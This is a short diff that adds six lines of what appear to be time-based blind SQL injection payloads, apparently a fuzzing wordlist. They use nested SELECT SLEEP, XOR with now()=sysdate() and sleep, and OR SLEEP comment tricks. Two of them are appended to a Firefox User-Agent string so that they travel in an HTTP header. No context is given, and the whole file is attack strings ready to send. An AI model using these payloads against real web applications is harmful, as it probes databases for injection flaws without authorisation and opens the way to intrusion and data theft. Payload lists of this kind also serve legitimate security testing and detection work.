@@ -1,0 +1,6 @@
+'+(select*from(select(sleep(20)))a)+'
+"XOR(if(now()=sysdate(),sleep(20),0))XOR"
+0'XOR(if(now()=sysdate(),sleep(16),0))XOR'Z
+1+or+SLEEP(18)--
+Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0'+(select*from(select(sleep(17)))a)+
+Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0'XOR(if(now()=sysdate(),sleep(17*1),0))OR'
